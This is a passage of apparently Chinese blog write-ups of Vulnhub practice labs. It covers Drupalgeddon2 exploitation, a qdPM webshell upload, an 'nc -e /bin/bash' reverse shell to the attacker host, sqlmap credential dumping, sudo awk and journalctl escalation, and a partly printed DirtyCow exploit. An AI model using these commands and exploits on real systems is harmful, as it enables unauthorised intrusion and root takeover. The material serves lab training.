<p>9001 端口，部署了 Drupal cms ，扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://fsociety.web:9001/</span><br><span class="line"></span><br><span class="line">[02:22:56] Starting: </span><br><span class="line">[02:22:58] 200 -  317B  - /.editorconfig                                   </span><br><span class="line">[02:23:00] 200 -  174B  - /.gitignore                                      </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess_orig                                  </span><br><span class="line">[02:23:00] 403 -  580B  - /.ht_wsr.txt                                     </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess.bak1                                  </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess.orig                                  </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccessOLD                                    </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess.sample</span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess.save</span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccessBAK</span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess_extra</span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccess_sc</span><br><span class="line">[02:23:00] 403 -  580B  - /.htm                                            </span><br><span class="line">[02:23:00] 403 -  580B  - /.htaccessOLD2</span><br><span class="line">[02:23:00] 403 -  580B  - /.httr-oauth</span><br><span class="line">[02:23:00] 403 -  580B  - /.htpasswds</span><br><span class="line">[02:23:00] 403 -  580B  - /.html                                           </span><br><span class="line">[02:23:00] 403 -  580B  - /.htpasswd_test                                  </span><br><span class="line">[02:23:07] 200 -    1KB - /COPYRIGHT.txt                                    </span><br><span class="line">[02:23:07] 200 -  108KB - /CHANGELOG.txt                                    </span><br><span class="line">[02:23:08] 200 -    2KB - /INSTALL.pgsql.txt                                </span><br><span class="line">[02:23:08] 200 -    2KB - /INSTALL.mysql.txt                                </span><br><span class="line">[02:23:09] 200 -   18KB - /INSTALL.txt                                      </span><br><span class="line">[02:23:09] 200 -   18KB - /LICENSE.txt                                      </span><br><span class="line">[02:23:09] 200 -    9KB - /MAINTAINERS.txt                                  </span><br><span class="line">[02:23:09] 200 -    5KB - /README.txt                                       </span><br><span class="line">[02:23:10] 200 -   10KB - /UPGRADE.txt                                      </span><br><span class="line">[02:23:16] 403 -  580B  - /admin/.htaccess                                  </span><br><span class="line">[02:23:26] 403 -  580B  - /administrator/.htaccess                          </span><br><span class="line">[02:23:30] 403 -  580B  - /app/.htaccess                                    </span><br><span class="line">[02:23:32] 403 -    3KB - /authorize.php                                    </span><br><span class="line">[02:23:41] 403 -    7KB - /cron.php                                         </span><br><span class="line">[02:23:53] 403 -  580B  - /includes/                                        </span><br><span class="line">[02:23:53] 301 -  194B  - /includes  -&gt;  http://fsociety.web:9001/includes/</span><br><span class="line">[02:23:53] 200 -   16KB - /index.php                                        </span><br><span class="line">[02:23:55] 200 -    3KB - /install.php                                      </span><br><span class="line">[02:23:59] 200 -  132KB - /includes/bootstrap.inc                           </span><br><span class="line">[02:24:05] 301 -  194B  - /misc  -&gt;  http://fsociety.web:9001/misc/         </span><br><span class="line">[02:24:06] 301 -  194B  - /modules  -&gt;  http://fsociety.web:9001/modules/   </span><br><span class="line">[02:24:06] 403 -  580B  - /modules/                                         </span><br><span class="line">[02:24:20] 301 -  194B  - /profiles  -&gt;  http://fsociety.web:9001/profiles/ </span><br><span class="line">[02:24:20] 200 -  271B  - /profiles/minimal/minimal.info                    </span><br><span class="line">[02:24:20] 200 -  743B  - /profiles/standard/standard.info</span><br><span class="line">[02:24:20] 200 -  278B  - /profiles/testing/testing.info                    </span><br><span class="line">[02:24:24] 301 -  194B  - /scripts  -&gt;  http://fsociety.web:9001/scripts/   </span><br><span class="line">[02:24:24] 403 -  580B  - /scripts/                                         </span><br><span class="line">[02:24:27] 301 -  194B  - /sites  -&gt;  http://fsociety.web:9001/sites/       </span><br><span class="line">[02:24:27] 200 - 1020B  - /sites/all/themes/README.txt                      </span><br><span class="line">[02:24:27] 200 -    1KB - /sites/all/modules/README.txt</span><br><span class="line">[02:24:27] 200 -  151B  - /sites/all/libraries/README.txt</span><br><span class="line">[02:24:27] 200 -  904B  - /sites/README.txt                                 </span><br><span class="line">[02:24:27] 200 -    0B  - /sites/example.sites.php                          </span><br><span class="line">[02:24:33] 403 -  580B  - /themes/                                          </span><br><span class="line">[02:24:34] 301 -  194B  - /themes  -&gt;  http://fsociety.web:9001/themes/     </span><br><span class="line">[02:24:35] 403 -    4KB - /update.php                                       </span><br><span class="line">[02:24:39] 200 -    2KB - /web.config                                       </span><br><span class="line">[02:24:42] 200 -   42B  - /xmlrpc.php     </span><br></pre></td></tr></table></figure>
<p>/CHANGELOG.txt，得当前版本是 Drupal 7.54，找找历史漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011802415.png" /></p>
<p>经测 <code>exploit/unix/webapp/drupal_drupalgeddon2</code>
可成功利用</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011803165.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>利用当前 shell 查得存在 elliot 用户，用
<code>elliot:5T3e!_M0un7i@N</code> 直接在22端口登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011807697.png" /></p>
<p>ssh 登录后的 shell 是受限的【/bin/rbash】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011828834.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>查查三个cms的数据库配置文件</p>
<p>drupal：/sites/default/settings.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupal_db&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;drupal_admin&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;p@$$_C!rUP@!_cM5&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>joomla：configuration.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JConfig</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$display_offline_message</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$offline_image</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sitename</span> = <span class="string">&#x27;fsociety&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$captcha</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$access</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;joomla_admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;j00m1_@_dBpA$$&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$db</span> = <span class="string">&#x27;joomla_db&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dbprefix</span> = <span class="string">&#x27;hs23w_&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;E2WM78yuyqAzib9N&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$error_reporting</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$helpurl</span> = <span class="string">&#x27;https://help.joomla.org/proxy/index.php?option=com_help&amp;amp;keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_host</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_port</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$offset</span> = <span class="string">&#x27;UTC&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mailonline</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mailfrom</span> = <span class="string">&#x27;Fluntence54@armyspy.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fromname</span> = <span class="string">&#x27;fsociety&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$MetaDesc</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$MetaKeys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$MetaVersion</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robots</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sef</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sef_rewrite</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sef_suffix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$unicodeslugs</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$feed_limit</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/html/joomla/logs&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/joomla/tmp&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>WordPress：wp-config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress_db&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wp_admin&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;UUs3R_C!B@p@55&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<p>依次进数据库看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udrupal_admin -Ddrupal_db -p</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011843422.png" /></p>
<p>其他两个数据同理……但没找到用于提权的什么信息</p>
<p>上传 linpeas.sh 执行，依旧没看到有可用信息……谷歌……看其他人是找到了个
<code>/var/www/html/drupal/misc/tyrell.pass</code> ，进而得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: tyrell</span><br><span class="line">Password: mR_R0bo7_i5_R3@!_</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011938992.png" /></p>
<p>journalctl 提权 <a
href="https://gtfobins.github.io/gtfobins/journalctl/">journalctl |
GTFOBins</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011938994.png" /></p>
<p>成功！</p>
<p><strong>推荐：</strong>
https://blog.csdn.net/weixin_43094965/article/details/135031881</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>DOUBLETROUBLE: 1</title>
    <url>/2023/10/07/doubletrouble-1/</url>
    <content><![CDATA[<blockquote>
<p>靶机介绍及下载：<a
href="https://www.vulnhub.com/entry/doubletrouble-1,743/">doubletrouble:
1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062140459.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.155 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062139224.png" /></p>
<p>开放端口：22【弱口令】，80【web信息收集】</p>
<h3 id="web信息收集">1.3. web信息收集</h3>
<p>80端口是个登陆界面，qdPM 9.1 有很多漏洞【<a
href="https://www.exploit-db.com/">Exploit Database - Exploits for
Penetration Testers, Researchers, and Ethical Hackers</a>
上可以查到RCE，SQL 注入，XSS等】但都需登陆后才能利用。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062257918.png" /></p>
<p>扫下目录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062258314.png" /></p>
<p>根据扫描结果找有价值的信息</p>
<p>在 <code>http://192.168.159.157/core/config/databases.yml</code>
找到了数据库配置信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062300359.png" /></p>
<p>结合 install
页面发现可以重置80端口登录的用户名和密码，但重置完后依旧无法登录……折腾了好长时间没找到有价值的信息，看了别人的解法才发现忽略了
secret 下的图片，下载图片并用图片隐写工具读取信息</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062311257.jpg"
alt="doubletrouble.jpg" />
<figcaption aria-hidden="true">doubletrouble.jpg</figcaption>
</figure>
<p>kali 先安装 steghide 和 stegseek ，用 steghide
查看已嵌入图片的文件信息，结果发现需要密码，由于 steghide
不提供密码爆破功能，所以用 stegseek 来爆破并提取嵌入的文件信息。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310062320699.png" /></p>
<p>得到登录邮件和密码 <code>otisrush@localhost.com/otis666</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="登录获取-shell">2.1. 登录获取 shell</h3>
<p>用前面获得的 <code>otisrush@localhost.com/otis666</code> 登录，在 <a
href="https://www.exploit-db.com/">Exploit Database - Exploits for
Penetration Testers, Researchers, and Ethical Hackers</a>
看了几个漏洞的利用本质是利用更新用户信息 photo 来实现 shell
的上传，为此尝试上传一句话木马</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070024868.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070024926.png" /></p>
<p>根据 <a href="https://www.exploit-db.com/exploits/47954">qdPM 9.1 -
Remote Code Execution - PHP webapps Exploit</a> 知上传后的路径在 <a
href="http://192.168.159.157/uploads/users/">http://192.168.159.157/uploads/users/</a>
下，蚁剑连接。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070027741.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070028035.png" /></p>
<p>找了下没找到 flag，可能权限不够导致的，考虑提权</p>
<h3 id="提权">2.2. 提权</h3>
<p><strong>查权限</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070041843.png" /></p>
<blockquote>
<p><strong>当渗透进系统并获得一个低权限shell后，如果允许当前用户通过
sudo 执行awk命令，可以通过
<code>sudo awk 'BEGIN &#123;system("/bin/bash")&#125;'</code> 进行提权。</strong>
<a href="https://gtfobins.github.io/gtfobins/awk/">awk GTFOBins</a></p>
</blockquote>
<p>而由上图可以看到出现了awk命令的帮助文档，说明<strong>可以通过sudo执行awk命令</strong>，注意蚁剑终端是不能直接提权的，试了下nc，结果当前权限可以正常执行，为此用
nc 反弹 shell 提权</p>
<p>蚁剑终端执行：<code>nc -e /bin/bash 192.168.159.152 4445</code></p>
<p>kali 监听：<code>nc -nvlp 4445</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070047158.png" /></p>
<p>shell 有局限性，<strong>调用本地终端获取更高级的交互
shell</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070101519.png" /></p>
<p>flag 没找到，但在根目录找到另一个虚拟机，可以用
<code>python3 -m http.server</code>
在靶机开个http服务下载，也可以用nc传递文件，kali中：<code>nc -lvvp 4446 &gt; doubletrouble.ova</code>，靶机中：<code>nc 192.168.159.152 4446 &lt; doubletrouble.ova</code>。本地VM将下载的第二个靶机导入</p>
<h3 id="主机探测-1">2.3. 主机探测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070123357.png" /></p>
<h3 id="端口扫描-1">2.4. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310070124441.png" /></p>
<p>所开端口：22，80</p>
<h3 id="web-信息收集">2.5. web 信息收集</h3>
<p>80端口是个登录界面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071203925.png" /></p>
<p>登录处发现存在 SQL 注入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --batch -D doubletrouble -T users --dump</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071226946.png" /></p>
<p>拿到两个用户信息，在22端口登录测试下，<code>clapton/ZubZub99</code>
可以进去，拿到第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071229417.png" /></p>
<h3 id="提权-1">2.6. 提权</h3>
<p>查内核版本</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071231368.png" /></p>
<p>存在脏牛提权漏洞</p>
<blockquote>
<p><a
href="https://zhuanlan.zhihu.com/p/439091715">从零入门linux内核安全：脏牛提权漏洞分析与补丁分析（CVE-2016-5195）
- 知乎</a> <a
href="https://www.cnblogs.com/mrliu0327/p/13456502.html">脏牛(DirtyCow)Linux本地提权漏洞复现(CVE-2016-5195)
- 无名之辈。 - 博客园</a></p>
</blockquote>
<p>POC.c【<a
href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">dirty.c</a>】</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="type">char</span> *username;</span><br><span class="line">   <span class="type">char</span> *hash;</span><br><span class="line">   <span class="type">int</span> user_id;</span><br><span class="line">   <span class="type">int</span> group_id;</span><br><span class="line">   <span class="type">char</span> *info;</span><br><span class="line">   <span class="type">char</span> *home_dir;</span><br><span class="line">   <span class="type">char</span> *shell;</span><br><span 